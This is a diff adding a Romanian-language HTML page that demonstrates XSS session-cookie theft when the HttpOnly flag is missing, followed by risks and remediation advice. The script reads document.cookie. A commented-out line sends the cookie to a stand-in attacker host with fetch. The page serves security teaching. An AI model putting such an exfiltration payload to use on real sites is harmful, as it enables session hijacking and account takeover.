@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Cookie Theft Simulation</title>
+</head>
+<body>
+    <h1>⚠️ XSS Cookie Theft Demonstration</h1>
+    
+    <p>Dacă aplicația e vulnerabilă la XSS și cookie-ul nu are HttpOnly flag:</p>
+    
+    <script>
+        // Aceasta ar fi payload-ul XSS injectat în pagină
+        console.log("🔴 Simulating XSS Attack - Attempting to steal session cookie...");
+        
+        // Dacă HttpOnly NU e setat, JavaScript poate accesa cookie-ul
+        if (document.cookie) {
+            console.log("❌ VULNERABLE! Cookie accessible via JavaScript:");
+            console.log(document.cookie);
+            
+            // Atacatorul ar trimite cookie-ul la serverul lui
+            // fetch('https://attacker.com/steal?cookie=' + document.cookie)
+        } else {
+            console.log("✅ PROTECTED! HttpOnly flag prevents access to session cookie");
+        }
+    </script>
+    
+    <h2>Risc:</h2>
+    <ul>
+        <li>❌ XSS payload injectat în pagină poate fura cookie-ul</li>
+        <li>❌ Atacatorul reutilizează sesiunea pe cont cuiva</li>
+        <li>❌ Accesul neautorizat la date personale</li>
+        <li>❌ Modificare de date pe cont</li>
+        <li>❌ Furt de informații sensibile</li>
+    </ul>
+    
+    <h2>Remediere:</h2>
+    <ul>
+        <li>✅ Setează HttpOnly flag - JavaScript nu poate accesa</li>
+        <li>✅ Setează Secure flag - numai HTTPS</li>
+        <li>✅ Scurtează token expiration (15-60 min)</li>
+        <li>✅ Implementează CSRF protection</li>
+        <li>✅ Sanitizează input-urile pentru a preveni XSS</li>
+    </ul>
+</body>
+</html>
